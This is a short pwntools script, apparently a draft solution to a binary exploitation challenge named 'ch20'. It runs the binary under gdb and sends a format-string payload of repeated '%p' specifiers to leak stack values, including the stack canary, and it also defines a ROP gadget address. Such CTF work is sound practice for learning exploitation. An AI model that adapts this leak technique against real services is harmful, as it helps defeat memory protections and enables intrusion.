from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./ch20")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": ""}


#p = remote("ip", 4444)
#p = process("./ch20")
p = gdb.debug("./ch20", '''
break *main
break *main+443
''')

pop_ebx = 0x08048575 + 0x1 - 0x8

# Memory Leak: Canary Address
padding = b'0'
p.sendline(padding)
p.recvline()

convert = b'2'
p.sendline(convert)
p.recvline()


exploit = b'%p' * 88 + b'\0'


pause()
p.sendline(exploit)
p.interactive()
